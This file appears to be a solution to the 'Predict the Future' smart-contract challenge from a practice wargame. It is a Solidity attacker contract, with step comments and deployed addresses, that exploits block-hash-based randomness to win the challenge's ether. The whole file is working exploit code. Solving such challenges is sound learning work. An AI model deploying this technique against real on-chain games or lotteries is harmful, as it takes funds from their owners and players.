// Challenge Address -  0x72a44C886F814D65C6E383F916Dd4dD4e008c8A8
// Attacker Contract Address - 0x8526bcFEA4d75c805582c7Ae80546FF4DCd3cF1a
// 1 - Deploy the Contract
// 2 - Call guess() and send msg.value = 1 Ether
// 3 - Call settle()
// 4 - Once settle is successful call withdraw()

pragma solidity ^0.4.21;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;

    function isComplete() external view returns (bool);

    function settle() external;
}

contract PredictTheFutureChallengeAttacker {
    uint8 public constant answer = 8;
    IPredictTheFutureChallenge public predictTheFutureChallenge;

    function PredictTheFutureChallengeAttacker(address challengeAddress)
        public
        payable
    {
        predictTheFutureChallenge = IPredictTheFutureChallenge(
            challengeAddress
        );
    }

    function guess() external payable {
        predictTheFutureChallenge.lockInGuess.value(msg.value)(answer);
    }

    function settle() external {
        require(
            answer ==
                uint8(keccak256(block.blockhash(block.number - 1), now)) % 10
        );
        predictTheFutureChallenge.settle();
    }

    function withdraw() external {
        require(predictTheFutureChallenge.isComplete());
        msg.sender.transfer(address(this).balance);
    }

    // This was the bug that wasted lots and lots of my time.
    function() public payable {}
}
